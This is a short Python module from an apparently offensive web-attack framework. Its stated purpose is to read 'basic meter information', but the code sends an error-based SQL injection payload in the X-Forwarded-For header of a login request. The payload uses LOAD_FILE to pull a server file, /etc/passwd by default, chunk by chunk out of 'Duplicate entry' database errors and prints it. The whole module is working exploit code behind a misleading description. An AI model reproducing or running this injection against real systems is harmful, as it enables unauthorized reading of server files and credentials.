#  modules/get_info.py
#
#  Copyright 2012 Kid :">

from w2a.core.templates import Templates
from w2a.lib.net.http import HTTP

from re import search, DOTALL
from sys import stdout

class Module(Templates):
	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self.version		= 1
		self.author			= [ 'Kid' ]
		self.description 	= 'Get Basic Meter Information By Reading Tables'
		self.detailed_description	= 'This module retreives some basic meter information and displays it in a human-readable way.'
		
		self.options.addString('FILE', 'domain/ip', default = '/etc/passwd')

	def run(self, frmwk, args):
		url = 'http://www.google.com/'
		self.victim		= HTTP(url)
		len = 1
		# join	= ''
		while True:
			header = {'x-forwarded-for': "1' order by (SELECT 1 from (select count(*),concat(floor(rand(0)*2),(substring((select(LOAD_FILE('%s'))),%s,62)))a from information_schema.tables group by a)b);-- -'" % (self.options['FILE'], len)}
			data = self.victim.Request(url, 'POST', "uname=administrator&upass=12345612345&Submit=+++Login+++",header = header)
			# print(data)
			res = search("Duplicate entry '.(.*?)' for key ", data, DOTALL)
			if res:
				# join += res.group(1)
				stdout.write(res.group(1))
				stdout.flush()
			else:
				break
			len += 62
		# print('--------------data---------- : \n' + join)